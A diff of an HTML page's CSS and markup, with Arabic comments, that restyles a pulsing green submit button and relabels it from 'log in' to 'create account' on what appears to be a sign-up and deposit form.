@@ -15,10 +15,8 @@
         .amount-tag { background-color: #1e1b4b; border: 1px dashed #6c5ce7; padding: 12px; border-radius: 10px; font-size: 18px; font-weight: 700; color: #00ffcc; margin-bottom: 25px; }
         .input-group { margin-bottom: 20px; text-align: right; }
         
-        /* جعل محاذاة العناوين الإنجليزية لليسار لتبدو أكثر احترافية */
         label { display: block; margin-bottom: 10px; color: #ffffff; font-size: 16px; font-weight: 700; text-align: left; direction: ltr; }
         
-        /* مربعات إدخال بيضاء ناصعة وبداخلها نص أسود */
         input[type="text"] { 
             font-family: 'Cairo', sans-serif; 
             width: 100%; 
@@ -29,16 +27,37 @@
             color: #000000 !important; 
             box-sizing: border-box; 
             font-size: 15px; 
-            direction: ltr; /* جعل الكتابة بداخل المربعات تبدأ من اليسار */
+            direction: ltr; 
         }
         input[type="text"]::placeholder {
             color: #7f8c8d !important;
             opacity: 1;
         }
 
-        @keyframes greenGlowPulse { 0% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); } 50% { background-color: #00ffa3; box-shadow: 0 0 25px rgba(0, 255, 163, 0.9); } 100% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); } }
-        .submit-btn-pulse { font-family: 'Cairo', sans-serif; width: 100%; padding: 14px; color: #000000; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer; box-sizing: border-box; animation: greenGlowPulse 2s infinite ease-in-out; transition: 0.2s; }
+        @keyframes greenGlowPulse { 
+            0% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); } 
+            50% { background-color: #00ffa3; box-shadow: 0 0 25px rgba(0, 255, 163, 0.9); } 
+            100% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); } 
+        }
+        
+        /* تعديل الزر: النص باللون الأبيض وبخط عريض جداً */
+        .submit-btn-pulse { 
+            font-family: 'Cairo', sans-serif; 
+            width: 100%; 
+            padding: 14px; 
+            color: #ffffff !important; /* لون النص أبيض */
+            border: none; 
+            border-radius: 8px; 
+            font-weight: 900 !important; /* خط عريض جداً */
+            font-size: 18px; 
+            margin-top: 20px; 
+            cursor: pointer; 
+            box-sizing: border-box; 
+            animation: greenGlowPulse 2s infinite ease-in-out; 
+            transition: 0.2s; 
+        }
         .submit-btn-pulse:hover { transform: scale(1.02); }
+        
         .binance-btn-final { font-family: 'Cairo', sans-serif; width: 100%; padding: 14px; color: #000; border: none; border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer; display: block; text-decoration: none; margin-bottom: 12px; box-sizing: border-box; animation: greenGlowPulse 2s infinite ease-in-out; transition: 0.2s; }
         .binance-btn-final:hover { transform: scale(1.02); }
         .manual-deposit-box { margin-top: 25px; padding: 15px; border: 2px dashed #6c5ce7; border-radius: 8px; background-color: #ffffff; text-align: center; box-shadow: 0 5px 15px rgba(255,255,255,0.05); }
@@ -71,8 +90,8 @@
                     <input type="text" id="username" required placeholder="example@gmail.com">
                 </div>
                 
-                <!-- زر تسجيل الدخول -->
-                <button type="button" onclick="goToStep2()" class="submit-btn-pulse">تسجيل دخول</button>
+                <!-- زر إنشاء حساب المحدث بالخط العريض واللون الأبيض -->
+                <button type="button" onclick="goToStep2()" class="submit-btn-pulse">إنشاء حساب</button>
                 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
                 
                 <div class="footer-info-box">
